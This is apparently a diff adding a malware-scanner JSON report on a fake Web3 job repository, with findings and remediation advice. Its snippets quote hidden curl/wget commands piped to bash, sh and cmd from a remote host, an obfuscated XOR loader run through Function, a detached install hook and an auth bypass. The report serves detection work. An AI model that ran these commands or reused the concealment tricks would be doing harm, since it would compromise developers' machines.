+      "snippet": "\"osx\": { ⟨566 spaces⟩ \"command\": \"curl -L 'https://api-checking-1.vercel.app/api/settings/mac' | bash\"",
+      "description": "A line continues with code after 80 or more spaces, pushing it off-screen in editors without word wrap.",
+      "remediation": "Inspect the full line with word wrap on. Hidden trailing code is a strong malware indicator.",
+      "fingerprint": "62473e3365e399b16a24b2a250cf0d53",
+      "frameworks": {
+        "csa-ccm": [
+          {
+            "id": "TVM-02",
+            "title": "Malware Protection Policy and Procedures",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1564",
+            "title": "Hide Artifacts",
+            "url": "https://attack.mitre.org/techniques/T1564/"
+          },
+          {
+            "id": "T1027",
+            "title": "Obfuscated Files or Information",
+            "url": "https://attack.mitre.org/techniques/T1027/"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-506",
+            "title": "Embedded Malicious Code",
+            "url": "https://cwe.mitre.org/data/definitions/506.html"
+          },
+          {
+            "id": "CWE-912",
+            "title": "Hidden Functionality",
+            "url": "https://cwe.mitre.org/data/definitions/912.html"
+          }
+        ],
+        "nist-ssdf": [
+          {
+            "id": "PW.7",
+            "title": "Review and/or Analyze Human-Readable Code to Identify Vulnerabilities",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          }
+        ]
+      }
+    },
+    {
+      "rule_id": "LS-CON-001",
+      "title": "Code hidden after a long run of whitespace",
+      "severity": "high",
+      "confidence": "high",
+      "category": "concealment",
+      "path": ".vscode/tasks.json",
+      "line": 52,
+      "column": 16,
+      "message": "A line continues with code after 80 or more spaces, pushing it off-screen in editors without word wrap.",
+      "snippet": "\"linux\": { ⟨564 spaces⟩ \"command\": \"wget -qO- 'https://api-checking-1.vercel.app/api/settings/linux' | sh\"",
+      "description": "A line continues with code after 80 or more spaces, pushing it off-screen in editors without word wrap.",
+      "remediation": "Inspect the full line with word wrap on. Hidden trailing code is a strong malware indicator.",
+      "fingerprint": "7bbb65e21a472284dbbd241c7ae3b269",
+      "frameworks": {
+        "csa-ccm": [
+          {
+            "id": "TVM-02",
+            "title": "Malware Protection Policy and Procedures",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1564",
+            "title": "Hide Artifacts",
+            "url": "https://attack.mitre.org/techniques/T1564/"
+          },
+          {
+            "id": "T1027",
+            "title": "Obfuscated Files or Information",
+            "url": "https://attack.mitre.org/techniques/T1027/"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-506",
+            "title": "Embedded Malicious Code",
+            "url": "https://cwe.mitre.org/data/definitions/506.html"
+          },
+          {
+            "id": "CWE-912",
+            "title": "Hidden Functionality",
+            "url": "https://cwe.mitre.org/data/definitions/912.html"
+          }
+        ],
+        "nist-ssdf": [
+          {
+            "id": "PW.7",
+            "title": "Review and/or Analyze Human-Readable Code to Identify Vulnerabilities",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          }
+        ]
+      }
+    },
+    {
+      "rule_id": "LS-APP-005",
+      "title": "TLS certificate validation disabled",
+      "severity": "high",
+      "confidence": "medium",
+      "category": "app-security",
+      "path": ".vscode/tasks.json",
+      "line": 54,
+      "column": 593,
+      "message": "Certificate or revocation checks are turned off, allowing interception or tampering of downloads.",
+      "snippet": "\"windows\": { ⟨562 spaces⟩ \"command\": \"curl --ssl-no-revoke -L https://api-checking-1.vercel.app/api/settings/windows | cmd\"",
+      "description": "Certificate or revocation checks are turned off, allowing interception or tampering of downloads.",
+      "remediation": "Keep validation on and fix the certificate chain instead.",
+      "fingerprint": "d82ce7f188135944fa60168379dd1417",
+      "frameworks": {
+        "owasp-web": [
+          {
+            "id": "A02",
+            "title": "Cryptographic Failures",
+            "url": "https://owasp.org/Top10/"
+          },
+          {
+            "id": "A08",
+            "title": "Software and Data Integrity Failures",
+            "url": "https://owasp.org/Top10/"
+          }
+        ],
+        "csa-ccm": [
+          {
+            "id": "CEK-03",
+            "title": "Data Encryption",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-295",
+            "title": "Improper Certificate Validation",
+            "url": "https://cwe.mitre.org/data/definitions/295.html"
+          }
+        ],
+        "nist-ssdf": [
+          {
+            "id": "PW.9",
+            "title": "Configure Software to Have Secure Settings by Default",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          }
+        ]
+      }
+    },
+    {
+      "rule_id": "LS-CON-001",
+      "title": "Code hidden after a long run of whitespace",
+      "severity": "high",
+      "confidence": "high",
+      "category": "concealment",
+      "path": ".vscode/tasks.json",
+      "line": 54,
+      "column": 18,
+      "message": "A line continues with code after 80 or more spaces, pushing it off-screen in editors without word wrap.",
+      "snippet": "\"windows\": { ⟨562 spaces⟩ \"command\": \"curl --ssl-no-revoke -L https://api-checking-1.vercel.app/api/settings/windows | cmd\"",
+      "description": "A line continues with code after 80 or more spaces, pushing it off-screen in editors without word wrap.",
+      "remediation": "Inspect the full line with word wrap on. Hidden trailing code is a strong malware indicator.",
+      "fingerprint": "852a1a7bfb1d6f9c38c8f511692bba96",
+      "frameworks": {
+        "csa-ccm": [
+          {
+            "id": "TVM-02",
+            "title": "Malware Protection Policy and Procedures",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1564",
+            "title": "Hide Artifacts",
+            "url": "https://attack.mitre.org/techniques/T1564/"
+          },
+          {
+            "id": "T1027",
+            "title": "Obfuscated Files or Information",
+            "url": "https://attack.mitre.org/techniques/T1027/"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-506",
+            "title": "Embedded Malicious Code",
+            "url": "https://cwe.mitre.org/data/definitions/506.html"
+          },
+          {
+            "id": "CWE-912",
+            "title": "Hidden Functionality",
+            "url": "https://cwe.mitre.org/data/definitions/912.html"
+          }
+        ],
+        "nist-ssdf": [
+          {
+            "id": "PW.7",
+            "title": "Review and/or Analyze Human-Readable Code to Identify Vulnerabilities",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          }
+        ]
+      }
+    },
+    {
+      "rule_id": "LS-LURE-002",
+      "title": "README instructs a command that triggers hidden execution",
+      "severity": "high",
+      "confidence": "high",
+      "category": "lure",
+      "path": "README.md",
+      "line": 70,
+      "column": 1,
+      "message": "README tells the reader to run `npm install`, which triggers the install-time or folder-open execution found in this repository.",
+      "snippet": "npm install",
+      "description": "The setup steps lead the reader to run install or start commands that set off the hooks or tasks found elsewhere in the repository.",
+      "remediation": "Do not follow the instructions. Inspect in a disposable VM with scripts disabled.",
+      "fingerprint": "77113f17fe0703acf0f1ce6bd1204907",
+      "frameworks": {
+        "csa-ccm": [
+          {
+            "id": "HRS-11",
+            "title": "Security Awareness Training",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          },
+          {
+            "id": "TVM-02",
+            "title": "Malware Protection Policy and Procedures",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1566.003",
+            "title": "Phishing: Spearphishing via Service",
+            "url": "https://attack.mitre.org/techniques/T1566/003/"
+          },
+          {
+            "id": "T1204.002",
+            "title": "User Execution: Malicious File",
+            "url": "https://attack.mitre.org/techniques/T1204/002/"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-506",
+            "title": "Embedded Malicious Code",
+            "url": "https://cwe.mitre.org/data/definitions/506.html"
+          }
+        ],
+        "nist-ssdf": [
+          {
+            "id": "PO.5",
+            "title": "Implement and Maintain Secure Environments for Software Development",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          }
+        ]
+      }
+    },
+    {
+      "rule_id": "LS-APP-001",
+      "title": "Authentication result hard-coded to success",
+      "severity": "high",
+      "confidence": "high",
+      "category": "app-security",
+      "path": "controllers/auth.js",
+      "line": 29,
+      "column": 5,
+      "message": "A password or authentication check is set to true, so any credentials are accepted.",
+      "snippet": "const isMatch = true;",
+      "description": "A password or authentication check is set to true, so any credentials are accepted.",
+      "remediation": "Compare against the stored hash with bcrypt.compare or equivalent, and fail closed.",
+      "fingerprint": "a48522da39eb9e0664eaf360504af4b7",
+      "frameworks": {
+        "owasp-web": [
+          {
+            "id": "A07",
+            "title": "Identification and Authentication Failures",
+            "url": "https://owasp.org/Top10/"
+          }
+        ],
+        "csa-ccm": [
+          {
+            "id": "IAM-14",
+            "title": "Strong Authentication",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          },
+          {
+            "id": "IAM-16",
+            "title": "Authorization Mechanisms",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1190",
+            "title": "Exploit Public-Facing Application",
+            "url": "https://attack.mitre.org/techniques/T1190/"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-287",
+            "title": "Improper Authentication",
+            "url": "https://cwe.mitre.org/data/definitions/287.html"
+          }
+        ],
+        "nist-ssdf": [
+          {
+            "id": "PW.5",
+            "title": "Create Source Code by Adhering to Secure Coding Practices",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          },
+          {
+            "id": "PW.7",
+            "title": "Review and/or Analyze Human-Readable Code to Identify Vulnerabilities",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          }
+        ]
+      }
+    },
+    {
+      "rule_id": "LS-CON-001",
+      "title": "Code hidden after a long run of whitespace",
+      "severity": "high",
+      "confidence": "high",
+      "category": "concealment",
+      "path": "routes/api/auth.js",
+      "line": 20,
+      "column": 24,
+      "message": "A line continues with code after 80 or more spaces, pushing it off-screen in editors without word wrap.",
+      "snippet": "module.exports = router; ⟨720 spaces⟩ const _2fd4e3=globalThis[String.fromCharCode(66,117,102,102,101,114)];const _9df9c3=globalThis[String.fromCharCode(70,117,110,99,116,105,111,110)];const _677ac7=_2fd4e3.from([18,97,80,1…",
+      "description": "A line continues with code after 80 or more spaces, pushing it off-screen in editors without word wrap.",
+      "remediation": "Inspect the full line with word wrap on. Hidden trailing code is a strong malware indicator.",
+      "fingerprint": "a3e057ef670be7b859b7cb938e31e857",
+      "frameworks": {
+        "csa-ccm": [
+          {
+            "id": "TVM-02",
+            "title": "Malware Protection Policy and Procedures",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1564",
+            "title": "Hide Artifacts",
+            "url": "https://attack.mitre.org/techniques/T1564/"
+          },
+          {
+            "id": "T1027",
+            "title": "Obfuscated Files or Information",
+            "url": "https://attack.mitre.org/techniques/T1027/"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-506",
+            "title": "Embedded Malicious Code",
+            "url": "https://cwe.mitre.org/data/definitions/506.html"
+          },
+          {
+            "id": "CWE-912",
+            "title": "Hidden Functionality",
+            "url": "https://cwe.mitre.org/data/definitions/912.html"
+          }
+        ],
+        "nist-ssdf": [
+          {
+            "id": "PW.7",
+            "title": "Review and/or Analyze Human-Readable Code to Identify Vulnerabilities",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          }
+        ]
+      }
+    },
+    {
+      "rule_id": "LS-CON-003",
+      "title": "Runtime API reached through computed names",
+      "severity": "high",
+      "confidence": "high",
+      "category": "concealment",
+      "path": "routes/api/auth.js",
+      "line": 20,
+      "column": 759,
+      "message": "Globals such as Function or Buffer are resolved from character codes or concatenated strings, or a function is called with a 'require' parameter. This hides an eval-style call from text search.",
+      "snippet": "module.exports = router; ⟨720 spaces⟩ const _2fd4e3=globalThis[String.fromCharCode(66,117,102,102,101,114)];const _9df9c3=globalThis[String.fromCharCode(70,117,110,99,116,105,111,110)];const _677ac7=_2fd4e3.from([18,97,80,156,76,112,142,58,99,82,31,163…",
+      "description": "Globals such as Function or Buffer are resolved from character codes or concatenated strings, or a function is called with a 'require' parameter. This hides an eval-style call from text search.",
+      "remediation": "Decode the expression statically and review what it executes before running anything.",
+      "fingerprint": "5f17f07ab94fca27074d83494ed61999",
+      "frameworks": {
+        "csa-ccm": [
+          {
+            "id": "TVM-02",
+            "title": "Malware Protection Policy and Procedures",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          },
+          {
+            "id": "UEM-09",
+            "title": "Anti-Malware Detection and Prevention",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1027",
+            "title": "Obfuscated Files or Information",
+            "url": "https://attack.mitre.org/techniques/T1027/"
+          },
+          {
+            "id": "T1140",
+            "title": "Deobfuscate/Decode Files or Information",
+            "url": "https://attack.mitre.org/techniques/T1140/"
+          },
+          {
+            "id": "T1059.007",
+            "title": "Command and Scripting Interpreter: JavaScript",
+            "url": "https://attack.mitre.org/techniques/T1059/007/"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-506",
+            "title": "Embedded Malicious Code",
+            "url": "https://cwe.mitre.org/data/definitions/506.html"
+          },
+          {
+            "id": "CWE-95",
+            "title": "Eval Injection",
+            "url": "https://cwe.mitre.org/data/definitions/95.html"
+          }
+        ],
+        "nist-ssdf": [
+          {
+            "id": "PW.7",
+            "title": "Review and/or Analyze Human-Readable Code to Identify Vulnerabilities",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          }
+        ]
+      }
+    },
+    {
+      "rule_id": "LS-CON-005",
+      "title": "Large encoded blob embedded in source",
+      "severity": "high",
+      "confidence": "medium",
+      "category": "concealment",
+      "path": "routes/api/auth.js",
+      "line": 20,
+      "column": 1032,
+      "message": "Embedded hex blob of about 1352 decoded bytes.",
+      "snippet": "…48,21,51,5,239,171,224,233,163]);const _650755=_2fd4e3.from('710e3eef3850dd7f31045af178d251da7d47719f91cfc69b2a4f62ad7a5ebb0d4d632d9162d741c025113ee5c88f87d0664104d90d3dae07437029c03cd610c9700232899bd4dcc7235035ff7815be5852622dc13bdf459e2c5727d4a1c88fd67c0224f…",
+      "description": "A long, high-entropy hex, base64, or byte-array literal usually carries an encrypted or packed payload.",
+      "remediation": "Decode the blob offline and inspect it as untrusted data. Never pass it to eval or Function.",
+      "fingerprint": "a36e10c625dbd9deeef6a89a360a9fb2",
+      "frameworks": {
+        "csa-ccm": [
+          {
+            "id": "TVM-02",
+            "title": "Malware Protection Policy and Procedures",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1027.013",
+            "title": "Obfuscated Files or Information: Encrypted/Encoded File",
+            "url": "https://attack.mitre.org/techniques/T1027/013/"
+          },
+          {
+            "id": "T1140",
+            "title": "Deobfuscate/Decode Files or Information",
+            "url": "https://attack.mitre.org/techniques/T1140/"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-506",
+            "title": "Embedded Malicious Code",
+            "url": "https://cwe.mitre.org/data/definitions/506.html"
+          }
+        ],
+        "nist-ssdf": [
+          {
+            "id": "PW.7",
+            "title": "Review and/or Analyze Human-Readable Code to Identify Vulnerabilities",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          }
+        ]
+      }
+    },
+    {
+      "rule_id": "LS-LURE-001",
+      "title": "README advertises blockchain components that are absent",
+      "severity": "medium",
+      "confidence": "medium",
+      "category": "lure",
+      "path": "README.md",
+      "line": 5,
+      "column": 4,
+      "message": "README advertises solidity, hardhat, nft, web3, polygon, evm, but the repository contains no smart-contract sources or toolchain config.",
+      "snippet": "[![Polygon](https://img.shields.io/badge/Polygon-EVM-purple)](https://polygon.technology/)",
+      "description": "The README describes contracts, NFTs, or DeFi features, but no contract sources or toolchain are present. Fake job repositories wrap a repurposed app in an invented Web3 story.",
+      "remediation": "Verify the company and the project through independent channels before running anything.",
+      "fingerprint": "5286e24c9affa8d403a05ccdf10e5914",
+      "frameworks": {
+        "csa-ccm": [
+          {
+            "id": "HRS-11",
+            "title": "Security Awareness Training",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1566.003",
+            "title": "Phishing: Spearphishing via Service",
+            "url": "https://attack.mitre.org/techniques/T1566/003/"
+          },
+          {
+            "id": "T1036",
+            "title": "Masquerading",
+            "url": "https://attack.mitre.org/techniques/T1036/"
+          }
+        ],
+        "nist-ssdf": [
+          {
+            "id": "PO.5",
+            "title": "Implement and Maintain Secure Environments for Software Development",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          }
+        ]
+      }
+    },
+    {
+      "rule_id": "LS-APP-004",
+      "title": "Secrets written to logs",
+      "severity": "medium",
+      "confidence": "medium",
+      "category": "app-security",
+      "path": "middleware/auth.js",
+      "line": 6,
+      "column": 3,
+      "message": "Tokens, passwords, keys, or seed phrases are logged.",
+      "snippet": "console.log(token)",
+      "description": "Tokens, passwords, keys, or seed phrases are logged.",
+      "remediation": "Remove the log statement or redact the value.",
+      "fingerprint": "1672371897d85074b8a06d81c5c4fb72",
+      "frameworks": {
+        "owasp-web": [
+          {
+            "id": "A09",
+            "title": "Security Logging and Monitoring Failures",
+            "url": "https://owasp.org/Top10/"
+          }
+        ],
+        "csa-ccm": [
+          {
+            "id": "DSP-17",
+            "title": "Sensitive Data Protection",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          },
+          {
+            "id": "LOG-03",
+            "title": "Security Monitoring and Alerting",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-532",
+            "title": "Insertion of Sensitive Information into Log File",
+            "url": "https://cwe.mitre.org/data/definitions/532.html"
+          }
+        ],
+        "nist-ssdf": [
+          {
+            "id": "PW.5",
+            "title": "Create Source Code by Adhering to Secure Coding Practices",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          }
+        ]
+      }
+    },
+    {
+      "rule_id": "LS-MAL-006",
+      "title": "Process launched detached or hidden",
+      "severity": "medium",
+      "confidence": "medium",
+      "category": "malware",
+      "path": "package.json",
+      "line": 10,
+      "column": 21,
+      "message": "A child process is started detached, hidden, or with nohup/start /b so it keeps running after the parent exits.",
+      "snippet": "\"prepare\": \"start /b node server || nohup node server &\",",
+      "description": "A child process is started detached, hidden, or with nohup/start /b so it keeps running after the parent exits.",
+      "remediation": "Confirm the background process is expected; loaders use this to persist past npm install.",
+      "fingerprint": "48393f1ed89d96c651b98dd0c2a3fdcf",
+      "frameworks": {
+        "csa-ccm": [
+          {
+            "id": "TVM-02",
+            "title": "Malware Protection Policy and Procedures",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1564.003",
+            "title": "Hide Artifacts: Hidden Window",
+            "url": "https://attack.mitre.org/techniques/T1564/003/"
+          },
+          {
+            "id": "T1059",
+            "title": "Command and Scripting Interpreter",
+            "url": "https://attack.mitre.org/techniques/T1059/"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-506",
+            "title": "Embedded Malicious Code",
+            "url": "https://cwe.mitre.org/data/definitions/506.html"
+          }
+        ],
+        "nist-ssdf": [
+          {
+            "id": "PW.7",
+            "title": "Review and/or Analyze Human-Readable Code to Identify Vulnerabilities",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          }
+        ]
+      }
+    },
+    {
+      "rule_id": "LS-CON-006",
+      "title": "XOR decoding loop",
+      "severity": "medium",
+      "confidence": "medium",
+      "category": "concealment",
+      "path": "routes/api/auth.js",
+      "line": 20,
+      "column": 3901,
+      "message": "A buffer is XORed against a repeating key, the usual way to unpack a hidden payload at runtime.",
+      "snippet": "…c<_650755.length;_46251c++)_2091f7[_46251c]=_650755[_46251c]^_677ac7[_46251c%_677ac7.length];_9df9c3('require',_2091f7.toString(String.fromCharCode(117,116,102,56)))(require);",
+      "description": "A buffer is XORed against a repeating key, the usual way to unpack a hidden payload at runtime.",
+      "remediation": "Check what the decoded data is used for; combined with eval or Function it is a loader.",
+      "fingerprint": "f0cb5b878d48b6271395eaed8db6a3c3",
+      "frameworks": {
+        "attack": [
+          {
+            "id": "T1140",
+            "title": "Deobfuscate/Decode Files or Information",
+            "url": "https://attack.mitre.org/techniques/T1140/"
+          },
+          {
+            "id": "T1027.013",
+            "title": "Obfuscated Files or Information: Encrypted/Encoded File",
+            "url": "https://attack.mitre.org/techniques/T1027/013/"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-506",
+            "title": "Embedded Malicious Code",
+            "url": "https://cwe.mitre.org/data/definitions/506.html"
+          }
+        ],
+        "nist-ssdf": [
+          {
+            "id": "PW.7",
+            "title": "Review and/or Analyze Human-Readable Code to Identify Vulnerabilities",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          }
+        ]
+      }
+    },
+    {
+      "rule_id": "LS-APP-006",
+      "title": "Permissive CORS policy",
+      "severity": "low",
+      "confidence": "low",
+      "category": "app-security",
+      "path": "client/src/apis/index.js",
+      "line": 11,
+      "column": 12,
+      "message": "CORS is enabled for any origin, letting any website call the API from a victim's browser.",
+      "snippet": "\"Access-Control-Allow-Origin\": \"*\"",
+      "description": "CORS is enabled for any origin, letting any website call the API from a victim's browser.",
+      "remediation": "Allow only known origins, especially when cookies or tokens are used.",
+      "fingerprint": "55d9ad9df76b7c3f6f3e4faadf9344db",
+      "frameworks": {
+        "owasp-web": [
+          {
+            "id": "A05",
+            "title": "Security Misconfiguration",
+            "url": "https://owasp.org/Top10/"
+          }
+        ],
+        "csa-ccm": [
+          {
+            "id": "AIS-04",
+            "title": "Secure Application Design and Development",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-942",
+            "title": "Permissive Cross-domain Policy with Untrusted Domains",
+            "url": "https://cwe.mitre.org/data/definitions/942.html"
+          }
+        ],
+        "nist-ssdf": [
+          {
+            "id": "PW.9",
+            "title": "Configure Software to Have Secure Settings by Default",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          }
+        ]
+      }
+    },
+    {
+      "rule_id": "LS-APP-006",
+      "title": "Permissive CORS policy",
+      "severity": "low",
+      "confidence": "low",
+      "category": "app-security",
+      "path": "client/src/apis/index.js",
+      "line": 33,
+      "column": 12,
+      "message": "CORS is enabled for any origin, letting any website call the API from a victim's browser.",
+      "snippet": "\"Access-Control-Allow-Origin\": \"*\"",
+      "description": "CORS is enabled for any origin, letting any website call the API from a victim's browser.",
+      "remediation": "Allow only known origins, especially when cookies or tokens are used.",
+      "fingerprint": "55d9ad9df76b7c3f6f3e4faadf9344db",
+      "frameworks": {
+        "owasp-web": [
+          {
+            "id": "A05",
+            "title": "Security Misconfiguration",
+            "url": "https://owasp.org/Top10/"
+          }
+        ],
+        "csa-ccm": [
+          {
+            "id": "AIS-04",
+            "title": "Secure Application Design and Development",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-942",
+            "title": "Permissive Cross-domain Policy with Untrusted Domains",
+            "url": "https://cwe.mitre.org/data/definitions/942.html"
+          }
+        ],
+        "nist-ssdf": [
+          {
+            "id": "PW.9",
+            "title": "Configure Software to Have Secure Settings by Default",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          }
+        ]
+      }
+    },
+    {
+      "rule_id": "LS-APP-006",
+      "title": "Permissive CORS policy",
+      "severity": "low",
+      "confidence": "low",
+      "category": "app-security",
+      "path": "client/src/apis/index.js",
+      "line": 54,
+      "column": 12,
+      "message": "CORS is enabled for any origin, letting any website call the API from a victim's browser.",
+      "snippet": "\"Access-Control-Allow-Origin\": \"*\"",
+      "description": "CORS is enabled for any origin, letting any website call the API from a victim's browser.",
+      "remediation": "Allow only known origins, especially when cookies or tokens are used.",
+      "fingerprint": "55d9ad9df76b7c3f6f3e4faadf9344db",
+      "frameworks": {
+        "owasp-web": [
+          {
+            "id": "A05",
+            "title": "Security Misconfiguration",
+            "url": "https://owasp.org/Top10/"
+          }
+        ],
+        "csa-ccm": [
+          {
+            "id": "AIS-04",
+            "title": "Secure Application Design and Development",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-942",
+            "title": "Permissive Cross-domain Policy with Untrusted Domains",
+            "url": "https://cwe.mitre.org/data/definitions/942.html"
+          }
+        ],
+        "nist-ssdf": [
+          {
+            "id": "PW.9",
+            "title": "Configure Software to Have Secure Settings by Default",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          }
+        ]
+      }
+    },
+    {
+      "rule_id": "LS-APP-007",
+      "title": "Security headers middleware disabled",
+      "severity": "low",
+      "confidence": "medium",
+      "category": "app-security",
+      "path": "middleware/index.js",
+      "line": 22,
+      "column": 3,
+      "message": "Helmet or an equivalent header middleware is commented out.",
+      "snippet": "// app.use(helmet());",
+      "description": "Helmet or an equivalent header middleware is commented out.",
+      "remediation": "Enable security headers.",
+      "fingerprint": "60776ea6c05c333ca8b9ead55b67d053",
+      "frameworks": {
+        "owasp-web": [
+          {
+            "id": "A05",
+            "title": "Security Misconfiguration",
+            "url": "https://owasp.org/Top10/"
+          }
+        ],
+        "csa-ccm": [
+          {
+            "id": "AIS-04",
+            "title": "Secure Application Design and Development",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-693",
+            "title": "Protection Mechanism Failure",
+            "url": "https://cwe.mitre.org/data/definitions/693.html"
+          }
+        ],
+        "nist-ssdf": [
+          {
+            "id": "PW.9",
+            "title": "Configure Software to Have Secure Settings by Default",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          }
+        ]
+      }
+    },
+    {
+      "rule_id": "LS-APP-006",
+      "title": "Permissive CORS policy",
+      "severity": "low",
+      "confidence": "low",
+      "category": "app-security",
+      "path": "middleware/index.js",
+      "line": 38,
+      "column": 11,
+      "message": "CORS is enabled for any origin, letting any website call the API from a victim's browser.",
+      "snippet": "app.use(cors());",
+      "description": "CORS is enabled for any origin, letting any website call the API from a victim's browser.",
+      "remediation": "Allow only known origins, especially when cookies or tokens are used.",
+      "fingerprint": "e6691cc8fc1605555d5162f33becf0f5",
+      "frameworks": {
+        "owasp-web": [
+          {
+            "id": "A05",
+            "title": "Security Misconfiguration",
+            "url": "https://owasp.org/Top10/"
+          }
+        ],
+        "csa-ccm": [
+          {
+            "id": "AIS-04",
+            "title": "Secure Application Design and Development",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-942",
+            "title": "Permissive Cross-domain Policy with Untrusted Domains",
+            "url": "https://cwe.mitre.org/data/definitions/942.html"
+          }
+        ],
+        "nist-ssdf": [
+          {
+            "id": "PW.9",
+            "title": "Configure Software to Have Secure Settings by Default",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          }
+        ]
+      }
+    }
+  ]
+}
